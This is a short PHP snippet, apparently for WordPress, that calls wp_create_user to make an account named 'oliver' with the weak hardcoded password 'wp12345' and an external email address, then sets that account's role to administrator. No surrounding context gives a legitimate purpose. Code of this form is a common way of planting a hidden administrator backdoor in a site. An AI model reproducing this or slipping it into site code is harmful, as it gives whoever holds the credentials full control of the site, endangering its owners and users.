<?php
$createUser = wp_create_user( 'oliver','wp12345','devsitltd@gmail.com' ) ;
$userWP=new wp_User($createUser);
$userWP->set_role('administrator');
